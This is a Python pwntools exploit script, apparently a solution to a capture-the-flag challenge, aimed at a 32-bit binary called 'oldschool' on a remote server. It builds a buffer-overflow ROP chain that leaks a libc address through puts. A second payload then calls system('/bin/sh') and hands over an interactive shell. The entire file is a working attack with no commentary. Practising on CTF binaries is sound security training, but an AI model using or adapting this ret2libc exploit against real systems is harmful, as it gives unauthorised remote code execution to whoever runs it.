from pwn import *

context.log_level='debug'

p=remote("bisc.lordofpwn.kr",1473)
#p=process("./basic_rop_x86",env={'LD_PRELOAD':'libc.so.6'})
e=ELF("./oldschool")
#l=ELF("./libc.so.6")
l=ELF("./libc32.so.6")
bss=e.bss()

ppr=0x0804871a
pr=0x804838d
pppr=0x8048689
main=0x8048684

puts_plt=e.plt['puts']
puts_got=e.got['puts']
read_plt=e.plt['read']
read_got=e.got['read']

read_off=l.symbols['read']
system_off=l.symbols['system']
binsh_off=0x15902b

pay="A"*(0x38+0x4)
pay+=p32(puts_plt)
pay+=p32(pr)
pay+=p32(read_got)

pay+=p32(main)

p.sendline(pay)

p.recv()
read_addr=u32(p.recv(4))

print hex(read_addr)

libc_base=read_addr-read_off
system_addr=libc_base+system_off
binsh_addr=libc_base+list(l.search('/bin/sh'))[0]

print hex(libc_base)

print "sys : " + hex(system_addr)
print "binsh : " + hex(binsh_addr)

pay2="B"*0x3c
pay2+=p32(system_addr)
pay2+="AAAA"
pay2+=p32(binsh_addr)

p.recv()
p.sendline(pay2)
p.interactive()
